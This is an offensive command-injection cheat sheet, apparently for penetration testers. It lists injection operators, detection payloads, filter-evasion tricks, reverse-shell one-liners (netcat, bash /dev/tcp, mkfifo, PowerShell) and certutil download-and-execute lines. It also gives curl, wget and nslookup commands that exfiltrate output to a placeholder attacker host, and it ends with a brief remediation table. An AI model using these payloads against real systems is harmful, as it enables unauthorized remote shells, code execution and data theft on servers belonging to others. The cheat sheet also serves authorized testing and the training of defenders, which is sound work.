# Command Injection

## What It Is

The app takes your input and passes it directly to a system shell command without sanitizing it. You inject additional OS commands into the input and the server executes them.

**Example vulnerable code:**
```php
$output = shell_exec("ping " . $_GET['ip']);
```

You send: `127.0.0.1; whoami` -> server runs: `ping 127.0.0.1; whoami` -> output of `whoami` comes back.

---

## Where to Look

Any input that seems to interact with the OS:
- IP/hostname fields ("ping this host", "traceroute", "lookup domain")
- File name or path inputs
- System utility wrappers (backup, scan, convert)
- Search fields on admin panels

---

## Injection Operators

Different operators work on different OS/contexts - try all of them:

```
# Linux & Windows (both)
;          127.0.0.1; whoami
&          127.0.0.1& whoami
&&         127.0.0.1&& whoami

# Linux only
|          127.0.0.1 | whoami
||         127.0.0.1 || whoami
`whoami`   (backtick - inline execution)
$(whoami)  (subshell)

# Windows only
|          127.0.0.1 | whoami
||         127.0.0.1 || whoami
```

---

## Basic Detection

```
# Test payloads - look for command output in response or time delay
; whoami
& whoami
| whoami
`whoami`
$(whoami)

# Time-based blind detection (no output shown)
; sleep 5
& ping -c 5 127.0.0.1
```

---

## Getting a Shell

### Linux Target

```sh
# Netcat reverse shell
; nc -e /bin/bash <KALI-IP> 4444
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI-IP> 4444 >/tmp/f

# Bash reverse shell
; bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1

# URL encoded (for GET params)
; bash+-i+>%26+/dev/tcp/<KALI-IP>/4444+0>%261
```

### Windows Target

```sh
# PowerShell reverse shell (URL encode the whole thing if in GET param)
; powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('<KALI-IP>',4444);..."

# Download and execute
; certutil -urlcache -split -f http://<KALI-IP>:8080/shell.exe C:\temp\shell.exe && C:\temp\shell.exe
```

---

## Bypasses (If Basic Payloads Are Filtered)

```sh
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat</etc/passwd

# Quote bypass
w'h'o'a'm'i
w"h"o"a"m"i

# Case bypass (Windows)
wHoAmI
WhOaMi

# Slash bypass (Windows)
who^ami

# Encoded newline (use %0a instead of ;)
127.0.0.1%0awhoami
```

---

## Exfiltrating Output (Blind Injection)

When you can inject commands but see no output:

```sh
# DNS exfil - output appears in your DNS logs
; nslookup $(whoami).<KALI-IP>.burpcollaborator.net

# HTTP exfil - output hits your web server
; curl http://<KALI-IP>:8080/$(whoami)
; wget http://<KALI-IP>:8080/?output=$(id | base64)

# File write - write output to web root, then read via browser
; whoami > /var/www/html/output.txt
# Visit: http://target/output.txt
```

---

## Listener

```sh
nc -lvnp 4444
```

---

## Remediation

**Root cause:** The application passes user-controlled input to a shell function (`system()`, `exec()`, `shell_exec()`, `popen()`, `os.system()`, `subprocess.call(shell=True)`) without sanitizing shell metacharacters.

| Finding | Remediation |
|---|---|
| Command injection via user input | **Avoid shell entirely** - use language-native libraries instead of shell commands. Example: instead of `shell_exec("ping " . $ip)`, use PHP's `net_ping` equivalent or ICMP libraries. |
| Must use shell (legacy code) | Use an **allowlist** - validate that input matches an expected pattern (e.g., IP address must match `^\d{1,3}(\.\d{1,3}){3}$`) before passing to shell. Reject anything that doesn't match exactly. |
| PHP `shell_exec` / `exec` | In PHP, use `escapeshellarg()` and `escapeshellcmd()` to sanitize. Not a perfect fix, but significantly reduces risk when rewriting isn't feasible. |
| Web server running as root | Run web server processes as a low-privilege dedicated account (e.g., `www-data`). Command injection then gives a low-priv shell, not root immediately. |

**Key point for reports:** The correct fix is to not use shell functions with user input at all - not to sanitize the input. Sanitization approaches fail; there are too many bypass techniques. Architecture is the solution.
